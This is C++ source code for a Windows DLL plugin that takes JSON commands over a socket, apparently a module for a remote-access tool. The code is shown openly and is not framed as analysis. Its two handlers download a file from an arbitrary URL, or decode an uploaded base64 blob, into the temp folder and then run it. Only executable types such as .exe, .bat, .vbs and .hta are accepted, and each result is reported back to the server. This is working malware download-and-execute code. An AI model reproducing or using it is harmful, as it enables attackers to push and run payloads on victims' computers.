#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <shellapi.h>
#include <urlmon.h>
#include <iostream>
#include <string>
#include <vector>
#include <fstream>
#include <algorithm>
#include "../../include/json.hpp"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "shell32.lib")

using json = nlohmann::json;
using namespace std;

// Base64 Decoder with Overflow Protection
vector<uint8_t> base64_decode(const string& in) {
    vector<uint8_t> out;
    vector<int> T(256, -1);
    for (int i = 0; i < 64; i++) {
        T["ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[i]] = i;
    }
    int val = 0, valb = -8;
    for (unsigned char c : in) {
        if (T[c] == -1) continue;
        val = (val << 6) + T[c];
        valb += 6;
        if (valb >= 0) {
            out.push_back((uint8_t)((val >> valb) & 0xFF));
            valb -= 8;
        }
        val &= 0xFFFFFF; // prevent left-shift overflow!
    }
    return out;
}

// Convert string to lower case
string toLower(string str) {
    transform(str.begin(), str.end(), str.begin(), ::tolower);
    return str;
}

// Check if file extension is allowed
bool isAllowedExtension(const string& path) {
    size_t queryPos = path.find('?');
    string cleanPath = (queryPos != string::npos) ? path.substr(0, queryPos) : path;

    size_t dotPos = cleanPath.find_last_of('.');
    if (dotPos == string::npos) return false;

    string ext = toLower(cleanPath.substr(dotPos));
    return (ext == ".exe" || ext == ".bat" || ext == ".vbs" || ext == ".py" || ext == ".hta");
}

// Generate file name or random
string getFileNameOrRandom(const string& url, const string& ext) {
    size_t queryPos = url.find('?');
    string cleanUrl = (queryPos != string::npos) ? url.substr(0, queryPos) : url;
    size_t slashPos = cleanUrl.find_last_of("\\/");
    if (slashPos != string::npos && slashPos + 1 < cleanUrl.length()) {
        string fname = cleanUrl.substr(slashPos + 1);
        if (isAllowedExtension(fname)) return fname;
    }
    return "temp_exec_" + to_string(GetTickCount64()) + ext;
}

// Send response JSON to Server
void sendResponse(SOCKET sock, const string& status, const string& message) {
    json j;
    j["action"] = "remote_execute_response";
    j["status"] = status;
    j["message"] = message;
    string msg = j.dump() + "\r\n";
    send(sock, msg.c_str(), (int)msg.length(), 0);
}

extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
    // Standard signature, not used directly but required for consistency
    sendResponse(sock, "error", "Plugin entry point not implemented for RunPlugin. Use HandleCommand.");
}

extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* commandJson) {
    try {
        auto data = json::parse(commandJson);
        string action = data.value("action", "");

        if (action == "remote_execute_url") {
            string url = data.value("url", "");
            if (url.empty()) {
                sendResponse(sock, "error", "URL is empty");
                return;
            }

            if (!isAllowedExtension(url)) {
                sendResponse(sock, "error", "Unsupported file extension in URL. Only .exe, .bat, .vbs, .py, and .hta are allowed.");
                return;
            }

            char tempDir[MAX_PATH];
            if (GetTempPathA(MAX_PATH, tempDir) == 0) {
                sendResponse(sock, "error", "Failed to get temp path");
                return;
            }

            string ext;
            size_t dotPos = url.find('?');
            string cleanUrl = (dotPos != string::npos) ? url.substr(0, dotPos) : url;
            size_t lastDot = cleanUrl.find_last_of('.');
            if (lastDot != string::npos) {
                ext = toLower(cleanUrl.substr(lastDot));
            }

            string destFile = string(tempDir) + getFileNameOrRandom(url, ext);

            // Download file
            HRESULT hr = URLDownloadToFileA(NULL, url.c_str(), destFile.c_str(), 0, NULL);
            if (FAILED(hr)) {
                sendResponse(sock, "error", "Failed to download remote file (HRESULT: " + to_string(hr) + ")");
                return;
            }

            // Execute file
            HINSTANCE hInst = ShellExecuteA(NULL, "open", destFile.c_str(), NULL, NULL, SW_SHOW);
            if ((uintptr_t)hInst <= 32) {
                sendResponse(sock, "error", "Failed to execute downloaded file (" + destFile + "). Error code: " + to_string((uintptr_t)hInst));
            } else {
                sendResponse(sock, "success", "Successfully downloaded and executed: " + destFile);
            }
        }
        else if (action == "remote_execute_local") {
            string filename = data.value("filename", "");
            string content64 = data.value("content", "");

            if (filename.empty() || content64.empty()) {
                sendResponse(sock, "error", "Filename or content is empty");
                return;
            }

            if (!isAllowedExtension(filename)) {
                sendResponse(sock, "error", "Unsupported file extension. Only .exe, .bat, .vbs, .py, and .hta are allowed.");
                return;
            }

            char tempDir[MAX_PATH];
            if (GetTempPathA(MAX_PATH, tempDir) == 0) {
                sendResponse(sock, "error", "Failed to get temp path");
                return;
            }

            string destFile = string(tempDir) + filename;
            vector<uint8_t> decodedBytes = base64_decode(content64);

            ofstream ofs(destFile, ios::binary);
            if (!ofs.is_open()) {
                sendResponse(sock, "error", "Failed to create local file in temp folder: " + destFile);
                return;
            }

            ofs.write((const char*)decodedBytes.data(), decodedBytes.size());
            ofs.close();

            // Execute file
            HINSTANCE hInst = ShellExecuteA(NULL, "open", destFile.c_str(), NULL, NULL, SW_SHOW);
            if ((uintptr_t)hInst <= 32) {
                sendResponse(sock, "error", "Failed to execute file (" + destFile + "). Error code: " + to_string((uintptr_t)hInst));
            } else {
                sendResponse(sock, "success", "Successfully uploaded and executed: " + destFile);
            }
        }
        else {
            sendResponse(sock, "error", "Unknown remote execution action: " + action);
        }
    }
    catch (const exception& e) {
        sendResponse(sock, "error", "Exception in HandleCommand: " + string(e.what()));
    }
    catch (...) {
        sendResponse(sock, "error", "Unknown exception in HandleCommand");
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    return TRUE;
}